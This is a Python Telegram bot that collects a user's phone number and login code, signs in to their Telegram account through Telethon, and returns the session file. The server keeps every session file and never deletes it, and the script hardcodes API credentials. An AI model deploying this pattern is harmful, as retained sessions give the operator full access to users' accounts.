import os
import telebot
from telebot import types
from telethon import TelegramClient
import asyncio
import threading

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)
os.makedirs('sessions', exist_ok=True)

user_clients = {}
user_phones = {}

# Запускаем асинхронный цикл в отдельном потоке
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop)

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуй /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_phones[uid] = phone
    
    async def send_code():
        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
        user_clients[uid] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(uid, "✅ Код отправлен! Введите его:")
            bot.register_next_step_handler(m, get_code)
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_clients[uid]
    
    run_async(send_code())

def get_code(m):
    uid = m.chat.id
    code = m.text.strip()
    
    if uid not in user_clients or uid not in user_phones:
        bot.send_message(uid, "❌ Ошибка, начни заново /start")
        return
    
    client = user_clients[uid]
    phone = user_phones[uid]
    
    async def login():
        try:
            await client.sign_in(phone, code)
            await client.disconnect()
            
            session_file = f'sessions/user_{uid}.session'
            if os.path.exists(session_file):
                with open(session_file, 'rb') as f:
                    bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
            else:
                bot.send_message(uid, "❌ Файл сессии не найден")
            
            del user_clients[uid]
            del user_phones[uid]
            
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_clients[uid]
            del user_phones[uid]
    
    run_async(login())

@bot.message_handler(commands=['cancel'])
def cancel(m):
    uid = m.chat.id
    if uid in user_clients:
        async def close():
            await user_clients[uid].disconnect()
        run_async(close())
        del user_clients[uid]
        del user_phones[uid]
    
    markup = types.ReplyKeyboardRemove()
    bot.send_message(uid, "❌ Отменено", reply_markup=markup)

def start_loop():
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

print("🚀 Session Bot запущен")
bot.infinity_polling()
